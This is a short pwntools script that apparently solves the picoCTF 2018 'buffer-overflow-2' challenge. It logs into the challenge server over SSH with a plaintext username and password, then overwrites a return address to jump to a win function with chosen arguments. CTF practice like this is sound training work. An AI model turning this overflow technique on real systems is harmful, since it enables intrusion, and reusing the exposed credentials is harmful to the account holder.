#coding=utf-8
from pwn import *

vuln = 0x80486be
gets = 0xffffd47c
ret = 0xffffd4ec
win = 0x080485cb

s=ssh(host='2018shell3.picoctf.com', user='Zeze', password='casper1014')
s.set_working_directory('/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa')

p = s.process('./vuln')
p.recvuntil('Please enter your string:')
p.sendline('a' * (ret - gets) + p32(win) + 'AAAA' + p32(0xdeadbeef) + p32(0xdeadc0de))
print p.recvall()
